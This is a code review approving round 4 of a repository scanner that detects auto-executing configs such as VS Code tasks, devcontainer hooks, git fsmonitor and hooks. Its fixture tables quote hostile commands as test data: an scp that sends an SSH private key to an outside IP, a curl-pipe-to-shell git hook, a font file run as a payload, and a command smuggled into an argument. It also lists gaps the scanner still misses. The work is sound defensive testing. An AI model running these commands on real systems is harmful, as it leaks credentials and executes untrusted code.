# Review: autoexec_on_open (round 4)

**Verdict: APPROVED**

Tests: `bash tests/test_scanner.sh` exits 0, including the new Tests 29 and 30.

I rebuilt the fixtures in `tmp/rv/` and made shallow clones in `tmp/rvfp/`. Both were deleted
afterwards.

The round-3 blocker (N1 residual) is fixed, and I found no new CRITICAL or HIGH-impact defects.

---

## N1: malformed-but-accepted configs (full scanner, `--no-interactive`)

| Fixture | Result |
|---|---|
| tasks.json `"command":"node","args":["public/fonts/x.woff2"]`, folderOpen, extra `}` | FOUND, rc=1 |
| devcontainer missing comma, `initializeCommand: "scp ~/.ssh/id_rsa a@1.2.3.4:"` | FOUND, rc=1 |
| devcontainer missing comma, exec-form `["sh","-c","cat ~/.ssh/id_rsa > .devcontainer/k"]` | FOUND, rc=1 |
| devcontainer missing comma, `initializeCommand: "bash .devcontainer/init.sh"` (ssh exfil) | FOUND, rc=1 |
| settings.json missing comma + trailing comma (benign) | WARN (1 analysis warnings), rc=0 |
| devcontainer missing comma + trailing garbage, `postCreateCommand: npm install` | WARN, rc=0 |
| tasks.json missing comma, folderOpen `npm run watch` | WARN, rc=0 |

More tolerant-parser cases, checked with the analyzer only:

| Case | Result |
|---|---|
| Missing colons (`"command" "curl…"`) | H |
| Leading garbage plus a raw newline in the command and a `.ttf` payload | H |
| `.claude/settings.json` with missing comma and `Bash(*)` | H |
| `,,` plus trailing comma with `mkdir` initializeCommand | I + E |

## New in round 4 (spot-verified)

| Case | Result |
|---|---|
| Shipped `.git/config` `core.fsmonitor` | H |
| Executable `.git/hooks/post-checkout` running curl\|sh | H |
| `!` alias in `.git/config` | H |
| `filter.*.smudge` in `.git/config` | H |
| A fresh `git init` | No records |
| `./repo-scanner.sh --repo <local dir with core.fsmonitor='touch /tmp/PWNED_rv'> --no-interactive --full-history` | rc=1, **no PWNED file**: git is not executed on local targets |

## Regression and false positives

The round-1, round-2 and round-3 fixture classes are covered by the green Tests 24–30 and by my
round-3 regression sample. FP spot-checks (round 4, local-mode scan of fresh clones, which includes
their `.git` dirs):

| Repo | Result |
|---|---|
| microsoft/vscode-eslint, nrwl/nx, cachix/devenv, anthropics/claude-code-action, astral-sh/ruff | INFO only |
| PowerShell/PowerShell, typicode/husky | No records |
| devcontainers/templates | Only the contracted kubernetes-helm initializeCommand H |

## CHECKPOINTS

| Checkpoint | Result | Notes |
|---|---|---|
| C1 Harness integrity | PASS | |
| C2 State coherence | PASS | One `[/]` task |
| C3 Architecture | PASS | Stdlib only; no debug output. `core.py` is 366 lines, over the 300-line convention (follow-up 1) |
| C4 Tests | PASS | 30 groups green; N1 shapes covered by Test 29 |
| C5 Security | PASS | No repo-controlled bypass found; git and semgrep no longer run git on local targets |
| C6 Session closure | PENDING (Leader) | `tmp/r4sec/` and `tmp/scan-75055/` (not created by this review) are under the gitignored `tmp/`; remove them. `history.md` entry, `TASKS.md` `[x]` and `current.md` reset are still due |

## Follow-ups (not blocking)
1. `checks/autoexec/core.py` is 366 lines. Split the new link helpers (`index_links`, `follow`, ...)
   into their own module to meet the 300-line convention.
2. A malformed config that triggers a HIGH yields two H records for the same command: the
   tolerant-handler one and the `lenient_scan` backstop (e.g. `FOUND (2 entries)`). Skip the backstop
   when the tolerant pass already produced an H for the file.
3. Docs that quote attack commands, e.g. `git config core.fsmonitor '…'` in a Markdown file, are HIGH
   through instruction scanning. This repo's own `progress/security_autoexec.md` triggers it. Consider
   INFO for `.md` text inside fenced examples or with no hooksPath/fsmonitor target in the repo.
4. Exec-form `initializeCommand: ["mkdir","-p","x;id"]` is a false-positive HIGH because exec form has
   no shell. The implementer already noted this.
5. Transitive local `require()` from scripts run by folderOpen or a hook. Also still open: lint-staged
   resolution, remote `repo:` entries in pre-commit, `.idea`/`.zed`, transitive `npm run`,
   `source_up`, and `env -u PYTHONPATH` for external tools.
